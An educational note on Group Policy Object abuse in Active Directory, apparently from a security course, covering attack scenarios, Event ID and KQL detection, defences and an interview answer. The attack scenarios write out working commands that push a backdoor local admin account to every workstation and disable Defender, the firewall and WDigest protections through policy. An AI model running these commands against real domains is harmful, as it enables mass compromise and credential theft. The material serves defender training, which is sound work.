# 11 — GPO Abuse

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Advanced  
> **Privilege required:** Write rights on a GPO or OU

---

## 📌 What is GPO Abuse?

Group Policy Objects control security settings and configurations across all machines in a domain. If an attacker gains **write access to a GPO**, they can push malicious configurations — scripts, startup executables, or security weakening settings — to every machine the GPO applies to.

> **Simple definition:**  
> GPO Abuse exploits write permissions on Group Policy Objects to push malicious code or configurations to all machines the GPO covers — potentially all machines in the domain.

---

## ⚙️ How It Works

### Scenario 1 — Attacker Has Write Rights on a GPO

```
BloodHound shows:
  hareesh → GenericWrite → "Security-Baseline" GPO
  "Security-Baseline" → Applied to → All Workstations OU (300 machines)

Attack using PowerView:
  # Add a malicious scheduled task to the GPO
  $GPO = Get-GPO -Name "Security-Baseline"
  
  # Create malicious scheduled task via registry
  # (Adds task that runs attacker's payload on every machine)
  
  # OR: Use SharpGPOAbuse tool
  SharpGPOAbuse.exe --AddComputerScript \
      --ScriptName "update.bat" \
      --ScriptContents "net user attacker P@ssw0rd /add & net localgroup administrators attacker /add" \
      --GPOName "Security-Baseline"
  
  # After GPO refresh (gpupdate or 90 minutes):
  → All 300 workstations create local admin "attacker" ✅
  → Attacker now has local admin on 300 machines

Real ransomware example:
  Ryuk ransomware (2019-2021) consistently used this technique:
  Compromise Domain Admin → Create GPO → Deploy ransomware script
  → All machines execute ransomware simultaneously at scheduled time
  → Entire company encrypted in minutes
```

### Scenario 2 — Abusing GPO via CreateChild on OU

```
If attacker has CreateChild permission on an OU:
  → Can link their own malicious GPO to that OU
  → Machines in OU receive attacker's GPO settings

  New-GPO -Name "Windows-Update-Policy"  ← innocent-looking name
  # Add malicious content to GPO
  New-GPLink -Name "Windows-Update-Policy" -Target "OU=Workstations,DC=company,DC=local"
  # All workstations now receive attacker's "update" policy ← malicious payload
```

### Scenario 3 — Weakening Security via GPO

```
Attacker has GPO write rights → disables security controls:

  # Disable Windows Defender via GPO
  Set-GPRegistryValue -Name "Security-Baseline" \
      -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" \
      -ValueName "DisableAntiSpyware" -Type DWord -Value 1

  # Disable Windows Firewall
  Set-GPRegistryValue -Name "Security-Baseline" \
      -Key "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" \
      -ValueName "EnableFirewall" -Type DWord -Value 0

  # Enable WDigest (allows cleartext password extraction)
  Set-GPRegistryValue -Name "Security-Baseline" \
      -Key "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" \
      -ValueName "UseLogonCredential" -Type DWord -Value 1
  
  # After GPO refresh:
  → Defender disabled on all machines ← undetected malware ✅
  → Firewall off ← open lateral movement ✅
  → WDigest enabled ← cleartext passwords in memory ✅
```

---

## 🔍 Detection

```
Event ID 5136 — Directory Service Object Modified
  Watch for:
  → GPO objects modified (objectClass: groupPolicyContainer)
  → Unexpected accounts modifying GPOs
  → New GPOs created (especially with generic names)
  → New GPO links created on sensitive OUs

Event ID 4104 — PowerShell ScriptBlock logging
  → PowerShell modifying GPO registry settings
  → SharpGPOAbuse execution

KQL for Sentinel:
  SecurityEvent
  | where EventID == 5136
  | where ObjectClass == "groupPolicyContainer"
  | where SubjectUserName !in (known_gpo_admins)
  | project TimeGenerated, SubjectUserName, ObjectName, AttributeValue

Defender for Identity:
  → "Suspicious modification of a Group Policy Object" alert
```

---

## 🛡️ Defence

```
1. Restrict GPO modification rights:
   Only Group Policy Creator Owners + Domain Admins should modify GPOs
   Audit: Get-GPPermission -All -Name "GPO-Name" | Select Trustee, Permission
   Remove any non-admin accounts with Edit rights

2. Enable GPO change logging:
   Audit Policy → Object Access → Active Directory Object Access: Success

3. Monitor all GPO changes (Event ID 5136)
   Alert immediately on any GPO modification outside change windows

4. Restrict GPO creation:
   Default Domain Policy → who can create GPOs
   GPO: Computer Config → Delegation → Group Policy Creator Owners
   Remove Domain Users — only specific admins should create GPOs

5. Use Microsoft's Advanced Group Policy Management (AGPM):
   Adds approval workflow for GPO changes
   All changes require second-person approval
   Full change history and rollback capability

6. Protect sensitive OUs from unauthorized GPO linking:
   Audit who has CreateChild/LinkGPO rights on each OU
   Remove unexpected permissions
```

---

## 🎯 Key Interview Questions

**Q: How can an attacker use GPO write access to compromise hundreds of machines simultaneously?**  
**A:** With GPO write access, an attacker can add malicious scripts to a startup/shutdown or logon/logoff script policy. When the GPO refreshes (every 90 minutes or on restart), all machines in scope execute the script as SYSTEM. This is exactly how ransomware groups like Ryuk deployed their payloads — one GPO modification causes simultaneous encryption across all machines. The scale makes it devastating: 300 machines encrypted in the time it takes for the next GPO refresh cycle.

---

*"GPO write access is domain-wide code execution. Treat it with the same severity as Domain Admin rights — because in terms of impact, it often is."*
